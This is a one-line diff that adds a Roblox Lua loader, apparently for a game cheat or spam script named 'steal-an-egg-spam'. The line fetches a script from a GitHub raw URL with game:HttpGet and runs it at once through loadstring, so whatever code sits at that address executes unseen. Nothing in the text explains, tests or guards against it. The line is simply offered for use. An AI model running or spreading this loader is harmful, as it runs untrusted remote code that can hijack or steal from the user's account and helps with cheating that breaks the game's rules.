@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ContractorStrike/loaders/main/loaders/steal-an-egg-spam3-w8fslahyocn67f.lua"))()
